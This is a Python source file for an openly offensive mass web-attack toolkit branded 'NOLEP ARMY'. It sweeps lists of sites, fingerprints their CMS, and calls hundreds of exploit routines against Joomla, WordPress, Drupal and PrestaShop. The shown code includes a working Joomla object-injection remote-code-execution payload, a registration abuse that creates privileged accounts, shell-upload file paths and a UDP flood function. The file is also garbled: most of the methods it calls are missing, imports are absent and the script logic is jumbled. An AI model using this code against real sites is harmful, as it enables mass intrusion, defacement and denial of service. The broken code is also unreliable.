import Smash
import datetime
import os
import sys
import time
import fileinput

try:
    from queue import Queue
except ImportError:
    from Queue import Queue

try:
    import requests
except ImportError:
    sys.exit()

def generate_payload(php_payload):
    try:
        php_payload = "eval({0})".format(php_payload)
        terminate = '\xf0\xfd\xfd\xfd'
        exploit_template = r'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory"
        :0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"J
        DatabaseDriverMysql":0:{}s:8:"feed_url";'''
        injected_payload = "{};JFactory::getConfig();exit".format(php_payload)
        exploit_template += r'''s:{0}:"{1}"'''.format(str(len(injected_payload)), injected_payload)
        exploit_template += r''';s:19:"cache_name_function";s:6:
        "assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatab
        aseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connec
        tion";b:1;}''' + terminate
        return exploit_template
    except KeyboardInterrupt:
        pass


class Bazooka(object):

    def get(text):
        return input(red + "[" + blue + "#" + red + "] - " + defcol + text)

    def saveToFile(proxy):
        with open(outputfile, 'a') as file:
            file.write(proxy + "\n")

    def isSocks(host, port, soc):
        proxy = host + ":" + port
        try:
            if socks5(host, port, soc):
                action("%s is socks5." % proxy)
                return True
            if socks4(host, port, soc):
                action("%s is socks4." % proxy)
                return True

        except socket.timeout:
            alert("Timeout during socks check: " + proxy)
            return False
        except socket.error:
            alert("Connection refused during socks check: " + proxy)
            return False

    def socks4(host, port, soc):  # Check if a proxy is Socks4 and alive
        ipaddr = socket.inet_aton(host)
        packet4 = "\x04\x01" + pack(">H", port) + ipaddr + "\x00"
        soc.sendall(packet4)
        data = soc.recv(8)
        if len(data) < 2:
            # Null response
            return False
        if data[0] != "\x00":
            # Bad data
            return False
        if data[1] != "\x5A":
            # Server returned an error
            return False
        return True

    @staticmethod
    def socks5(port, soc):  # Check if a proxy is Socks5 and alive
        soc.sendall("\x05\x01\x00")
        data = soc.recv(2)
        if len(data) < 2:
            # Null response
            return False
        if data[0] != "\x05":
            # Not socks5
            return False
        if data[1] != "\x00":
            # Requires authentication
            return False
        return True

    def isAlive(pip, timeout):  # Check if a proxy is alive
        try:
            proxy_handler = urllib2.ProxyHandler({'http': pip})  # Setup proxy handler
            opener = urllib2.build_opener(proxy_handler)
            opener.addheaders = [('User-agent', 'Mozilla/5.0')]  # Some headers
            urllib2.install_opener(opener)  # Install the opener
            req = urllib2.Request(Smash)  # Make the request
            socked = urllib2.urlopen(req, None, timeout=timeout)  # type: object # Open url
        except urllib2.HTTPError as e:  # Catch exceptions
            error(pip + " throws: " + str(e.code))
            return False
        except Exception as details:
            error(pip + " throws: " + str(details))
            return False
        return True

    @staticmethod
    def checkProxies():
        while len(toCheck) > 0:
            proxy = toCheck[0]
            toCheck.pop(0)
            alert("Checking %s" % proxy)

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)

            host = proxy.split(":")[0]
            port = proxy.split(":")[1]
            if int(port) < 0 or int(port) > 65536:
                error("Invalid port for " + proxy)
                continue
            if isSocks(host, port, s):
                socks.append(proxy)
                saveToFile(proxy)
            else:
                alert("%s not a working socks 4/5." % proxy)
                if isAlive(proxy, timeout):
                    action("Working http/https proxy found (%s)!" % proxy)
                    working.append(proxy)
                    saveToFile(proxy)
                else:
                    error("%s not working.")
            s.close()

    def __init__(self):
        try:
            os.mkdir('Exploited')
        except:
            pass
        try:
            os.mkdir('Login')
        except:
            pass
        self.r = '\033[31m'
        self.g = '\033[32m'
        self.y = '\033[33m'
        self.b = '\033[34m'
        self.m = '\033[35m'
        self.c = '\033[36m'
        self.w = '\033[37m'
        self.Headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        self.shell_code = open('Files/shcode.txt', 'rb').read().splitlines()
        self.version = '2.3.0'
        self.year = time.strftime("%y")
        self.month = time.strftime("%m")
        self.EMail = 'moetazbusiness@gmail.com'  # --> Put Your Email Address here
        self.Jce_Deface_image = 'Files/pwn.gif'
        self._shell = 'Files/shell.jpg'
        self.indeX = 'Files/index.jpg'
        self.TextindeX = 'Files/spy.txt'
        self.MailPoetZipShell = 'Files/spy.zip'
        self.ZipJd = 'Files/jdownlods.zip'
        self.pagelinesExploitShell = 'Files/settings_auto.php'
        self.jdShell = 'Files/vuln.php3.j'
        self.ShellPresta = 'Files/up.php'
        self.gravShell = 'Files/gravity.jpg'
        self.JoomRCEB6 = open('Files/base64RCE.txt', 'rb').read().splitlines()
        try:
            self.select = sys.argv[1]
        except:
            self.cls()
            self.print_logo()
            sys.exit()
        if self.select == str('bazooka'):
            self.cls()
            self.print_logo()
            self.concurrent = 90
            try:
                try:
                    self.Get_list = input(
                        self.g + '\n[!]' + self.r + ' WELCOME TO HELL ENTER LIST OF WEBSITES : ' + self.w)
                except:
                    self.Get_list = input(
                        self.g + '\n[!]' + self.r + ' WELCOME TO HELL ENTER LIST OF WEBSITES : ' + self.w)

            except IOError:
                print(self.r + '[' + self.r + '!' + self.r + '] ' + self.r + 'Open your eyes!')
                sys.exit()
            self.q = Queue(self.concurrent * 2)
            for i in range(self.concurrent):
                self.t = thread.Thread(target=self.doWork)
                self.t.daemon = True
                self.t.start()
            try:
                for url in open(self.Get_list):
                    self.q.put(url.strip())
                self.q.join()
            except:
                pass

    def doWork(self):
        try:
            while True:
                url = self.q.get()
                if url.startswith('http://'):
                    url = url.replace('http://', '')
                elif url.startswith("https://"):
                    url = url.replace('https://', '')
                else:
                    pass
                try:
                    CheckOsc = requests.get('http://' + url + '/admin/images/cal_date_over.gif', timeout=10,
                                            headers=self.Headers)
                    CheckOsc2 = requests.get('http://' + url + '/admin/login.php', timeout=10,
                                             headers=self.Headers)
                    CheckCMS = requests.get('http://' + url + '/templates/system/css/system.css', timeout=5,
                                            headers=self.Headers)
                    Checktwo = requests.get('http://' + url, timeout=5, headers=self.Headers)
                    if 'Import project-level system CSS' in CheckCMS.text or CheckCMS.status_code == 200:
                        self.joomver(url)
                        self.createuser(url)
                        self.RCE_Joomla(url)
                        self.Com_AdsManager_Shell(url)
                        self.Com_AdsManager_Shellx(url)
                        self.alberghiExploit(url)
                        self.Com_CCkJseblod(url)
                        self.Com_CCkJseblodx(url)
                        self.Com_Fabric(url)
                        self.Com_Fabricx(url)
                        self.Com_Hdflvplayer(url)
                        self.Com_Hdflvplayerx(url)
                        self.Com_Jdownloads_shell(url)
                        self.Com_Joomanager(url)
                        self.Com_Joomanagerx(url)
                        self.Com_MyBlog(url)
                        self.Com_MyBlogx(url)
                        self.Com_Macgallery(url)
                        self.Com_Macgalleryx(url)
                        self.JCE_shell(url)
                        self.Com_s5_media_player(url)
                        self.Com_s5_media_playerx(url)
                        self.Com_Jbcatalog(url)
                        self.Com_Jbcatalogx(url)
                        self.Com_SexyContactform(url)
                        self.Com_SexyContactformx(url)
                        self.Com_rokdownloads(url)
                        self.Com_rokdownloadsx(url)
                        self.Com_extplorer(url)
                        self.Com_extplorerx(url)
                        self.Com_jwallpapers_Shell(url)
                        self.Com_facileforms(url)
                        self.Com_facileformsx(url)
                        self.JooMLaBruteForce(url)
                        self.Jce_Test(url)
                        self.Com_Jdownloads(url)
                        self.Com_Jdownloadsx(url)
                        self.Jce_Testx(url)
                        self.comadsmanager(url)
                        self.com_simplephotogallery(url)
                        self.com_media(url)
                        self.comfabrik(url)
                        self.mod_socialpinboard_menu(url)
                        self.foxcontact(url)
                        self.com_b2jcontact(url)
                        self.com_users(url)
                        self.com_weblinks(url)
                        self.mod_simplefileupload(url)
                        self.com_redmystic(url)
                        self.com_civicrm(url)
                        self.com_acymailing(url)
                        self.com_jnewsletter(url)
                        self.com_jinc(url)
                        self.com_maianmedia(url)
                        self.com_jnews(url)
                        self.com_joomleague(url)
                        self.com_spidersql(url)
                        self.mod_dvfoldercontentcnf(url)
                        self.jw_allvideoscnf(url)
                        self.com_product_modulcnf(url)
                        self.com_cckjseblodcnf(url)
                        self.com_contushdvideosharecnf(url)
                        self.com_communitycnf(url)
                        self.com_aceftpcnf(url)
                        self.wddownloadcnf(url)
                        self.FckEditor(url)
                    elif '/wp-content/' in Checktwo.text:
                        self.membershipsimplified(url)
                        self.MacPhotoGallery(url)
                        self.jtrtresponsivetables(url)
                        self.acento(url)
                        self.ajaxstore(url)
                        self.Antioch(url)
                        self.Authentic(url)
                        self.Churchope(url)
                        self.Epic(url)
                        self.Felis(url)
                        self.Force(url)
                        self.hbaudio(url)
                        self.History(url)
                        self.Imageex(url)
                        self.kbslider(url)
                        self.Linenity(url)
                        self.Lote27(url)
                        self.Markant(url)
                        self.MichaelCanthony(url)
                        self.mTheme(url)
                        self.NativeChurch(url)
                        self.Parallelus(url)
                        self.RedSteel(url)
                        self.S3bubble(url)
                        self.TheLoft(url)
                        self.cpanel(url)
                        self.wpmver(url)
                        self.Wordpress(url)
                        self.Revslider_SHELL(url)
                        self.wysijaExploit(url)
                        self.WP_User_Frontend(url)
                        self.Gravity_Forms_Shell(url)
                        self.HD_WebPlayerSqli(url)
                        self.pagelinesExploit(url)
                        self.HeadWayThemeExploit(url)
                        self.addblockblocker(url)
                        self.cherry_plugin(url)
                        self.formcraftExploit_Shell(url)
                        self.UserProExploit(url)
                        self.wp_mobile_detector(url)
                        self.Wp_Job_Manager(url)
                        self.wp_content_injection(url)
                        self.viral_optins(url)
                        self.Woocomrece(url)
                        self.CateGory_page_icons(url)
                        self.Downloads_Manager(url)
                        self.wp_support_plus_responsive_ticket_system(url)
                        self.wp_miniaudioplayer(url)
                        self.eshop_magic(url)
                        self.ungallery(url)
                        self.barclaycart(url)
                        self.wp_gdpr_compliance(url)
                        self.Wordpressinstaller(url)
                        self.betheme(url)
                        self.woopraRCE(url)
                        self.invit0r(url)
                        self.formidable(url)
                        self.evarisk(url)
                        self.wpslimstatRCE(url)
                        self.completeGalleryManager(url)
                        self.ShoppingCart(url)
                        self.auctionPlugin(url)
                        self.area53(url)
                        self.utstrange(url)
                        self.ThisWay(url)
                        self.theagency(url)
                        self.switchblade(url)
                        self.atom(url)
                        self.purevision(url)
                        self.magnitudo(url)
                        self.cubed_v1dot2(url)
                        self.RightNow(url)
                        self.Tevolution(url)
                        self.html5avmanager(url)
                        self.dzsvideowhisper(url)
                        self.galleryversion(url)
                        self.konzept(url)
                        self.Seowatcher(url)
                        self.omnisecurefil(url)
                        self.pitchprint(url)
                        self.satoshi(url)
                        self.radialth(url)
                        self.pinboard(url)
                        self.wpstorecart(url)
                        self.armyknife(url)
                        self.assetmanager(url)
                        self.evolve(url)
                        self.acffrontenddisplay(url)
                        self.designfolioplus(url)
                        self.Learndash(url)
                        self.MarketPlace(url)
                        self.uploaderplug(url)
                        self.wpproperty(url)
                        self.socialnetwork(url)
                        self.magicfields(url)
                        self.custombackground(url)
                        self.ecstatic(url)
                        self.customtshirtdesigner(url)
                        self.qualifire(url)
                        self.boxit(url)
                        self.Ghostth(url)
                        self.Coldfusion(url)
                        self.simplecart(url)
                        self.ninetofive(url)
                        self.JsorSliders(url)
                        self.clockstone(url)
                        self.Blaze(url)
                        self.Catpro(url)
                        self.downloadsmanagr(url)
                        self.formcraft(url)
                        self.openflashchart(url)
                        self.dreamwork(url)
                        self.contactform(url)
                        self.fluid_forms(url)
                        self.levoslideshow(url)
                        self.vertical(url)
                        self.carousel(url)
                        self.superb(url)
                        self.yass(url)
                        self.homepageslideshow(url)
                        self.imagenewsslider(url)
                        self.blissnewsslider(url)
                        self.xdatatoolkit(url)
                        self.powerzoomer(url)
                        self.woocommerceproductsfilter(url)
                        self.mmformscommunity(url)
                        self.developertools(url)
                        self.genesis_simple(url)
                        self.dzs_portfolio(url)
                        self.dzs_videogallery(url)
                        self.RevsliderGetcPanel(url)
                        self.showbiz(url)
                        self.SimpleAdsManager(url)
                        self.slideshowpro(url)
                        self.InBoundio_Marketing(url)
                        self.dzs_zoomsounds(url)
                        self.Reflex_Gallery(url)
                        self.Creative_Contact_Form(url)
                        self.Realestate_tema_upload(url)
                        self.Work_The_Flow_File_Upload(url)
                        self.brainstorm(url)
                        self.php_event_calendar(url)
                        self.synoptic(url)
                        self.u_design(url)
                        self.workflow(url)
                        self.wp_shop(url)
                        self.RobotcaLFDcnf(url)
                        self.miwoftpLFDcnf(url)
                        self.ebookLFDcnf(url)
                        self.yakimabaitcnf(url)
                        self.filemanagercnf(url)
                        self.trinitycnf(url)
                        self.RedSteelcnf(url)
                        self.paralleluscnf(url)
                        self.kbslider_show(url)
                        self.view_pdfcnf(url)
                        self.advanced_uploader(url)
                        self.urbancitycnf(url)
                        self.mTheme_Unuscnf(url)
                        self.Revslider_SHELLx(url)
                        self.Revslider_Configx(url)
                        self.Revslider_cssx(url)
                        self.wysijaExploitx(url)
                        self.WP_User_Frontendx(url)
                        self.Gravity_Forms_Shellx(url)
                        self.HD_WebPlayerSqlix(url)
                        self.pagelinesExploitx(url)
                        self.HeadWayThemeExploitx(url)
                        self.addblockblockerx(url)
                        self.cherry_pluginx(url)
                        self.formcraftExploit_Shellx(url)
                        self.formcraftExploitIndeXx(url)
                        self.UserProExploitx(url)
                        self.wp_mobile_detectorx(url)
                        self.Wp_Job_Managerx(url)
                        self.wp_content_injectionx(url)
                        self.viral_optinsx(url)
                        self.Woocomrecex(url)
                        self.osCommercex(url)
                        self.CateGory_page_iconsx(url)
                        self.Downloads_Managerx(url)
                        self.wp_support_plus_responsive_ticket_systemx(url)
                        self.wp_miniaudioplayerx(url)
                        self.eshop_magicx(url)
                        self.ungalleryx(url)
                        self.barclaycartx(url)
                        self.osCommerce(url)
                        self.FckEditor(url)
                    elif '/sites/default/' in Checktwo.text \
                            or 'content="Drupal' in Checktwo.text:
                        self.Drupal_Bartik(url)
                        self.Drupal_Sqli_Addadmin(url)
                        self.DrupalGedden2(url)
                        self.DrupalBruteForce(url)
                        self.Drupal8RCERest(url)
                        self.FckEditor(url)
                    elif 'D9ABB614B8D911E3AB27A52B5ED2F278' in CheckOsc.text or 'osCommerce' in CheckOsc2.text:
                        self.osCommerce(url)
                        self.OsCommerceBF(url)
                        self.FckEditor(url)
                    elif 'prestashop' in Checktwo.text:
                        self.lib(url)
                        self.additionalproductstabs(url)
                        self.addthisplugin(url)
                        self.orderfiles(url)
                        self.wdoptionpanel(url)
                        self.pk_vertflexmenu(url)
                        self.masseditproduct(url)
                        self.blocktestimonial(url)
                        self.lokomedia(url)
                        self.realty(url)
                        self.resaleform(url)
                        self.megaproduct(url)
                        self.filesupload(url)
                        self.columnadverts(url)
                        self.leosliderlayer(url)
                        self.vtemskitter(url)
                        self.libx(url)
                        self.psmodthemeoptionpanel(url)
                        self.psmodthemeoptionpanelx(url)
                        self.tdpsthemeoptionpanel(url)
                        self.tdpsthemeoptionpanelx(url)
                        self.megamenu(url)
                        self.megamenux(url)
                        self.nvn_export_orders(url)
                        self.nvn_export_ordersx(url)
                        self.pk_flexmenu(url)
                        self.pk_flexmenux(url)
                        self.wdoptionpanelx(url)
                        self.fieldvmegamenu(url)
                        self.fieldvmegamenux(url)
                        self.wg24themeadministration(url)
                        self.wg24themeadministrationx(url)
                        self.videostab(url)
                        self.videostabx(url)
                        self.cartabandonmentproOld(url)
                        self.cartabandonmentproOldx(url)
                        self.cartabandonmentpro(url)
                        self.cartabandonmentprox(url)
                        self.advancedslider(url)
                        self.advancedsliderx(url)
                        self.attributewizardpro_x(url)
                        self.attributewizardpro_xx(url)
                        self.attributewizardpro3(url)
                        self.attributewizardpro3x(url)
                        self.attributewizardpro2(url)
                        self.attributewizardpro2x(url)
                        self.attributewizardpro(url)
                        self.attributewizardprox(url)
                        self.jro_homepageadvertise(url)
                        self.jro_homepageadvertisex(url)
                        self.homepageadvertise2(url)
                        self.homepageadvertise2x(url)
                        self.homepageadvertise(url)
                        self.homepageadvertisex(url)
                        self.productpageadverts(url)
                        self.productpageadvertsx(url)
                        self.simpleslideshow(url)
                        self.vtermslideshow(url)
                        self.soopabanners(url)
                        self.soopamobile(url)
                        self.columnadverts(url)
                        self.simpleslideshowx(url)
                        self.vtermslideshowx(url)
                        self.soopabannersx(url)
                        self.soopamobilex(url)
                        self.columnadvertsx(url)
                        self.FckEditor(url)
                    elif 'catalog/view/' in Checktwo.text:
                        self.OpenCart(self.Url)
                        self.FckEditor(Url)
                    elif 'Magento' in Checktwo.text:
                        self.Magento(self.Url)
                        self.FckEditor(Url)
                    else:
                        self.Vbulletin_RCE5(url)
                        self.vehiculo_photos(url)
                        self.FilesUpp(url)
                        self.tinymce(url)
                        self.Ajaxfilemanager1(url)
                        self.Arrayfil(url)
                        self.jquery(url)
                        self.PhotoStore(url)
                        self.cfg_contactform(url)
                        self.PHP_Fusion(url)
                        self.uploadifyamazons3(url)
                        self.umapresence(url)
                        self.TikiWiki(url)
                        self.FckEditor(url)

                except:
                    print("gagal...")
        except:
            print("gagal...")

    def print_logo(self):
        clear = "\x1b[0m"
        colors = [31]

        x = """

X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>@@@@@@@@@@@@@@@@
X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>@@@@@@@@@@@@@@@@
X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>@@@@@@@@@@@@@@@@
X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>@@@@@@@@@@@@@@@@
@@@@@&    @@@@@(    &X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>@@@@@@@@@@@@@@@@@@@@@@
@@@@      &@ ,@      @@@   &@ @,@(@   @%X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>@@@
@@@@       (          @@@@@@@@@@@ @..@@.@    @@@@@@@@@@@@@@@@@@@@@@@@@
@@@@                  @@@@@@@@@@@ @  @  @    @@@@@@@@@@@@@@@@@@@@@@@@@
@@@                    @@@@@@@@@@& . ,#*. (X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>
@@@@        @@       .X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>@@@@@@@@@@@@@@@@@@@@@
@@@@@@    @@@@      @@@  @@@     &     @@,  @@@@   @@  @,  @@@@@@@@@@@
@@@@@@      @@      @@  ( @@@  @@@@  @@@% @  @  @@@@@    @@@@@@@@@@@@@
@@@@@@      @@      @  @@  @@  @@@@  @@@ @@@ .@    @@  @&  @@@@@@@@@@@
@@@@@@@     @@     X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@            X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X   NOLEP ARMY
@@@@@@@            X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>@     TOOLKITS By Miftah45
X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>@@@@@@@@@@@@@@@@

                [#] DoubleAttack thread - 1-ATTACK TOOLSKIT [#]
                            [NolepArmy Version v2.5]
                            [Author Name] : Miftah45

one-attack!!
"""

    now = datetime.datetime.now()
    print('\n\033[92m                        STARTED AT: ' + str(now))

    def Print_Scanning(self, url, CMS):
        print(self.g + '[' + self.g + '>' + self.g + '] ' + self.w + 'http://' + url + ' ' + self.g + ' [' + CMS + ']')

    def Timeout(self, url):
        print(self.g + '[' + self.g + '>' + self.g + '] ' + self.w + 'http://' + url + ' ' + self.r + ' [ TimeOut]')

    def Print_NotVuln(self, NameVuln, site):
        print(self.g + '[' + self.g + '>' + self.g + '] '
              + self.w + 'http://' + site + ' ' + ' ' + self.g + ' [' + NameVuln + '] ' + self.r + ' [Failed]')

    def Print_Username_Password(self, username, Password):
        print(self.g + '[' + self.g + '>' + self.g + '] ' + self.w + 'Username: ' + self.g + username)
        print(self.g + '[' + self.g + '>' + self.g + '] ' + self.w + 'Password: ' + self.g + Password)

    def Print_Vuln(self, NameVuln, site):
        print(self.g + '[' + self.g + '>' + self.g + '] ' + self.w + 'http://' + site + ' ' + ' ' +
              self.g + ' [' + NameVuln + '] ' + self.g + ' [Done]')

    def Print_Vuln_index(self, indexPath):
        print(self.g + '[' + self.g + '>' + self.g + '] ' + self.g + indexPath + self.g + ' [Get Index]')

    def Print_vuln_Shell(self, shellPath):
        print(self.g + '[' + self.g + '>' + self.g + '] '
              + self.w + shellPath + self.g + ' [Get Shell]')

    def Print_vuln_Config(self, pathconfig):
        print(self.g + '[' + self.g + '>' + self.g + '] '
              + self.w + pathconfig + self.g + ' [Get Config]')

    def printor(self, ch, site):
        print(self.g + '[' + self.g + '>' + self.g + '] ' + self.w + 'http://' + site + ' ' + ' ' +
              self.g + ' [' + ch + '] ')
        with open('Path/%s.txt' % (ch), 'a') as lll:
            lll.write(site + '\n')

    def AdminTakeOver(self, NameVuln, site):
        print(self.g + '[' + self.g + '>' + self.g + '] ' + self.w + 'http://' + site + ' ' + ' ' +
              self.g + ' [' + NameVuln + '] ' + self.g + ' [Get Admin]')

    def cls(self):
        linux = 'clear'
        windows = 'cls'

    def createuser(self, site):
        try:
            form_url = self.site + \
                       '/index.php/using-joomla/extensions/components/users-component/registration-form'
            action_url = self.site + \
                         '/index.php/using-joomla/extensions/components/users-component/registration-form?task=registration.register'
            username = str(random.randrange(1000, 10000))
            email = username + 'moetazbusiness@gmail.com'
            password = ''.join(random.choice(
                string.ascii_uppercase + string.digits) for _ in range(8))

            user_data = {
                'name': username,
                'username': username,
                'password1': password,
                'password2': password + 'XXXinvalid',
                'email1': email,
                'email2': email,
                'groups][': '7'
            }

            session = requests.Session()
            response = session.get(form_url, verify=False)
            if response.status_code != 200:
                return
            soup = bs4.BeautifulSoup(response.text, 'lxml')
            form = soup.find('form', id='member-registration')
            data = {e['name']: e['value'] for e in form.find_all('input')}
            user_data = {'%s]' % k: v for k, v in user_data.items()}
            data.update(user_data)
            response = session.post(action_url, data=data)
            data['jform[password2]'] = data['jform[password1]']
            # del data['jform[groups][]']
            response = session.post(action_url, data=data)
            sys.stdout.write(
                "\a[+] Account created for user: {}, password: {}, email: {}".format(username, password, email))
            with open('Exploited/createuser.txt', 'a') as joomla_admins:
                joomla_admins.write(self.site + '\n')
                joomla_admins.write('User: ' + username + '\n')
                joomla_admins.write('Pass: ' + password + '\n')
                joomla_admins.write('Email: ' + email + '\n')
        except AttributeError:
            pass
            return

    def udp(ip, nbytes):
        while 1:
            port = random.randint(80, 8080)
            bytes_ = random._urandom(nbytes)
            stdout.write("\rSending %i bytes to %s:%i" % (len(bytes_), ip, port))
            s.sendto(bytes_, (ip, port))
            s.close()


Bazooka()
socks = []
working = []
toCheck = []
threads = []
checking = True

q = input("Output txt file target list with port (out.txt): ")
outputfile = int(get("Threads 1: "))
threadsnum = int(get("Number of threads: "))
timeout = int(get("Timeout(seconds): "))
try:
    # noinspection PyTypeChecker
    q = open(q, "w")  # type: object
except:
    print("Your txt file is not found  *v*")
finally:
    qpath = r'[\]'
    if not os.path.exists(qpath):
        print('File does not exist')
    errorExit(" Unable to open file: %s" % q)

for line in q.readlines():
    toCheck.append(line.strip('\n'))
    q.close()

if os.path.isfile(qpath):
    check = ''
    while check != 'yes' and check != 'y':
        error("Output file already exist, content will be overwritten!")
        check = get("Are you sure you would like to continue(y/n)?").lower()
        if check == 'n' or check == 'no':
            errorExit("Quitting...")

if os.path.isfile(qpath):
    check = ''
    while check != 'yes' and check != 'y':
        error("Output file already exist, content will be overwritten!")
        check = get("Are you sure you would like to continue(y/n)?").lower()
        if check == 'n' or check == 'no':
            errorExit("Quitting...")

for i in xrange(threadsnum):
    threads.append(threading.Thread(target=checkProxies))
    threads[i].setDaemon(True)
    action("Starting thread n: " + str(i + 1))
    threads[i].start()
    time.sleep(0.25)

action(str(threadsnum) + " threads started...")
while checking:

    time.sleep(5)
    if len(threading.enumerate()) - 1 == 0:
        alert("All threads done.")
        action(str(len(working)) + " alive proxies.")
        action(str(len(socks)) + " socks proxies.")
        action(str(len(socks) + len(working)) + " total alive proxies.")
        checking = False
    else:
        alert(str(len(working)) + " alive proxies until now.")
        alert(str(len(socks)) + " socks proxies until now.")
        alert(str(len(toCheck)) + " remaining proxies.")
        alert(str(len(threading.enumerate()) - 1) + " active threads...")
